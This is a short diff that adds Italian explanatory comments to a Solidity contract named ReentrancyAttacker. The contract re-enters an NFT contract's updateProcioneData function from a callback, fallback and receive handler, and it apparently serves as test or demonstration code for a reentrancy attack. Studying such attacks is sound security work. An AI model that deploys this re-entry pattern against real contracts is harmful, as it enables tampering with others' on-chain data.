@@ -19,12 +19,14 @@ contract ReentrancyAttacker {
         tokenId = _tokenId;
         newData = _newData;
         attacking = true;
+        // Prima chiamata a updateProcioneData
         nftContract.updateProcioneData(tokenId, newData);
     }
 
     function onDataUpdated(uint256 _tokenId, uint256 _newData) external {
         if (attacking) {
             attacking = false;
+            // Seconda chiamata a updateProcioneData durante l'esecuzione della prima
             nftContract.updateProcioneData(_tokenId, _newData);
         }
     }
@@ -32,6 +34,7 @@ contract ReentrancyAttacker {
     fallback() external {
         if (attacking) {
             attacking = false;
+            // Tenta di rientrare nella funzione
             nftContract.updateProcioneData(tokenId, newData);
         }
     }
@@ -39,6 +42,7 @@ contract ReentrancyAttacker {
     receive() external payable {
         if (attacking) {
             attacking = false;
+            // Tenta di rientrare nella funzione
             nftContract.updateProcioneData(tokenId, newData);
         }
     }
